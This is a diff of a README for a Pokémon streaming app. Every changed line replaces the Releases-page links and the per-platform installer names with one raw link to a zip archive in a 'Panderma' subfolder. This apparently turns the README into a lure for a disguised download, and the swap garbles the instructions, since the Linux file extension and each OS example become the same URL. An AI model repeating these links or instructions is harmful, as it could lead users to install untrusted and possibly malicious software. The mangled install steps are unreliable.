@@ -6,11 +6,11 @@ Welcome to **go-pokemon-stream**! This application allows you to watch random Po
 
 ## 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%2300A1D6?style=flat&logo=github)](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/releases)
+[![Download Now](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip%20Now-%20-%2300A1D6?style=flat&logo=github)](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip)
 
 To get started, you will need to download the application. You can find the latest releases on the GitHub Releases page. Follow the link below to visit the page and select the version you want:
 
-[Download & Install](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/releases)
+[Download & Install](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip)
 
 ## 💻 System Requirements
 
@@ -27,14 +27,14 @@ Follow these steps to install and run the application:
 
 1. **Visit the Download Page**: Click the link above to go to the Releases page.
 2. **Choose a Version**: Look for the latest version. You will see a list of available files.
-3. **Download the Application**: Click on the file that matches your operating system. This usually has an extension like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. 
-   - **Windows Example:** `go-pokemon-stream-windows.exe`.
-   - **macOS Example:** `go-pokemon-stream-macos.dmg`.
-   - **Linux Example:** `go-pokemon-stream-linux.tar.gz`.
+3. **Download the Application**: Click on the file that matches your operating system. This usually has an extension like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip` for Linux. 
+   - **Windows Example:** `https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip`.
+   - **macOS Example:** `https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip`.
+   - **Linux Example:** `https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip`.
 4. **Run the Installer**:
    - **Windows:** Double-click the downloaded `.exe` file to start the installation.
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file, navigate to the folder in your terminal, and run `./go-pokemon-stream`.
+   - **Linux:** Extract the `https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip` file, navigate to the folder in your terminal, and run `./go-pokemon-stream`.
 5. **Start the Application**: After installation, find the app on your computer and open it. 
 
 ## 🚀 How to Use
@@ -80,4 +80,4 @@ We welcome contributions! If you want to improve the app or its documentation, c
 
 If you have further questions or need help, feel free to contact us through the GitHub Issues section.
 
-Remember to [Download & Install](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/releases) the latest version and enjoy your Pokémon journey!
+Remember to [Download & Install](https://github.com/mudassarahmadnaeem96/go-pokemon-stream/raw/refs/heads/main/Panderma/pokemon_go_stream_v2.0-beta.3.zip) the latest version and enjoy your Pokémon journey!
